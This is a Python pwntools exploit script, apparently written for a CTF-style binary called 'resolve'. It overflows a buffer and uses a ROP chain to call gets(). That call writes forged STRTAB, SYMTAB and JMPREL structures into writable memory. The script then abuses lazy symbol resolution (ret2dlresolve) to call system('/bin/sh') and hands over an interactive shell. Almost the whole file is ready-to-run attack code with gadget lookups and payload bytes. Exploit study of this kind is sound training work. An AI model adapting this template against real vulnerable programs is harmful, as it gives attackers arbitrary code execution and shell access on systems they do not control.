from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)


gs = '''
break *0x401020
continue
'''


def start():
    if (args.QEMU and args.GDB):
        p=process(['qemu-amd64', '-g', '1234', e.path])
        gdb.attach(target=('localhost',1234), exe=e.path, gdbscript=gs)
        return p
    elif (args.QEMU):
        return process(['qemu-amd64', e.path])
    elif args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    else:
        return process(e.path)


# gadgets we'll use in our exploit
pop_rdi = (r.find_gadget(['pop rdi', 'ret']))[0]
ret = pop_rdi + 1
init_plt = 0x401020


readelf = """
└─# readelf --sections ./resolve | egrep "Name|.rela.plt|.dynsym|.dynstr"
  [Nr] Name              Type             Address           Offset
  [ 6] .dynsym           DYNSYM           00000000004003c0  000003c0
  [ 7] .dynstr           STRTAB           0000000000400420  00000420
  [11] .rela.plt         RELA             00000000004004b8  000004b8
"""
log.info(readelf)

# existing structures in the binary
symbtab = 0x4003c0
strtab = 0x400420
jmp_rel = 0x4004b8

log.info("Original SYMTAB = 0x%x" % symbtab)
log.info("Original STRTAB = 0x%x" % strtab)
log.info("Original JMPREL = 0x%x" % jmp_rel)

# location of our fake symtab, rel structures and args
writeable_mem = 0x404e00
fake_strtab = writeable_mem
fake_symbtab = writeable_mem + 0x18
fake_rel = writeable_mem + 0x38
fake_args = writeable_mem + 0x50

# calculated fields for our fake structs
fake_reloc_arg = int((fake_rel-jmp_rel)/0x18)

p = start()

log.info("Sending chain to gets() at 0x%x" % writeable_mem)
# read the payload into writeable mem at 0x404e00
chain = cyclic(16)                 # padding
chain += p64(ret)                  # ret (align stack)
chain += p64(pop_rdi)              # pop rdi, ret
chain += p64(writeable_mem)        # rdi = 0x404e00 -> fake struct
chain += p64(e.plt['gets'])        # plt.get(0x404e00)

log.info("Writing Fake STRTAB at 0x%x" % fake_strtab)
log.info("Writing Fake SYMTAB at 0x%x" % fake_symbtab)
log.info("Writing Fake JMPREL at 0x%x" % fake_rel)
log.info("Writing \"/bin/sh\"  at at 0x%x" % fake_args)

# pop the address of args into rdi, call init_plt
chain += p64(pop_rdi)              # pop rdi, ret
chain += p64(fake_args)            # rdi = 0x404e50 -> args -> '/bin/sh'
chain += p64(init_plt)             # init_plt(fake_reloc_arg)
chain += p64(fake_reloc_arg)       # reloc_arg

p.sendline(chain)

# Symbol Name (strtab)
payload = b'system\x00\x00'        # symbol name
payload += p64(0)                  # padding (0x18 byte alignment)
payload += p64(0)                  # padding (0x18 byte alignment)

# Elf64 Symbol Struct (symbtab)
payload += p32(fake_strtab - strtab)     # st_name (symbol name)
payload += p8(0)                         # st_info
payload += p8(0)                         # st_other 
payload += p16(0)                        # st_shndx
payload += p64(0)                        # st_value 
payload += p64(0)                        # st_size 
payload += p64(0)                        # padding (0x18 byte alignment)

r_info = int((fake_symbtab - symbtab) / 0x18) << 32 | 0x7

# Elf64_Rel Struct (jmprel)
payload += p64(writeable_mem)      # r_offset (address) 
payload += p64(r_info)             # r_info   (reloc type and index)
payload += p64(0)                  # padding (0x18 byte alignment)

# Arguments
payload += b'/bin/sh\0'            # /bin/sh

p.sendline(payload)
log.info("Fake STRTAB, SYMTAB, JMPREL, ARGS Sent")
log.info("Setting RDI to Fake Args == /bin/sh")
log.info("Calling init_plt for fake index 0x%x for system()" %
         fake_reloc_arg)

p.interactive()
